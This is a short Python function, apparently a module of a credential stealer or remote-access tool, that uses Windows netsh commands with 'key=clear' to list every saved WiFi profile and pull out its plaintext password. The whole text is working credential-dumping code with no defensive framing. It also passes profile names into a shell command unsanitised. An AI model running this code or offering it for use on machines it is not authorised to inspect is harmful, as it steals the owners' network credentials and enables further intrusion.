def wifi_dump():
    import subprocess
    import re
    try:
        output = subprocess.check_output(
            'netsh wlan show profiles', shell=True
        ).decode(errors='replace')
        profiles = re.findall(r'All User Profile\s*:\s*(.*)', output)
        result = ''
        for profile in profiles:
            profile = profile.strip()
            details = subprocess.check_output(
                f'netsh wlan show profile "{profile}" key=clear',
                shell=True
            ).decode(errors='replace')
            password = re.search(r'Key Content\s*:\s*(.*)', details)
            pw = password.group(1).strip() if password else '[NO PASSWORD]'
            result += f'[>] {profile}: {pw}\n'
        return result.strip() or '[-] No WiFi profiles found'
    except Exception:
        return '[-] WiFi dump failed (Windows only)'
